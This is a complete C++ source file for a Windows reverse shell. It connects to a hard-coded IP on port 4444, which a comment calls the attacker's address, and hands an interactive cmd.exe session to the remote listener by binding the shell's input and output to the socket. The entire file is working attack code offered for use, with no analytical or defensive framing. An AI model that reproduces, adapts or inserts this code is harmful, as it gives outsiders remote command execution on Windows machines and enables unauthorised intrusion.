#include <iostream>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsa;
    SOCKET client_socket;
    struct sockaddr_in server_addr;
    const char *server_ip = "10.0.1.35";  // Replace with your attacker's IP
    int server_port = 4444;  // Replace with the listener port

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        std::cout << "WSAStartup failed. Error: " << WSAGetLastError() << std::endl;
        return 1;
    }

    // Create socket
    if ((client_socket = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
        std::cout << "Socket creation failed. Error: " << WSAGetLastError() << std::endl;
        return 1;
    }

    // Set up the server address structure
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(server_ip);
    server_addr.sin_port = htons(server_port);

    // Connect to the listener
    if (connect(client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        std::cout << "Connection failed. Error: " << WSAGetLastError() << std::endl;
        return 1;
    }

    // Redirect stdin, stdout, and stderr to the socket using CreateProcess
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE)client_socket;
    si.hStdOutput = (HANDLE)client_socket;
    si.hStdError = (HANDLE)client_socket;

    // Start the shell (cmd.exe)
    if (!CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        std::cout << "CreateProcess failed. Error: " << GetLastError() << std::endl;
        return 1;
    }

    // Wait for the process to exit
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Cleanup
    closesocket(client_socket);
    WSACleanup();
    return 0;
}
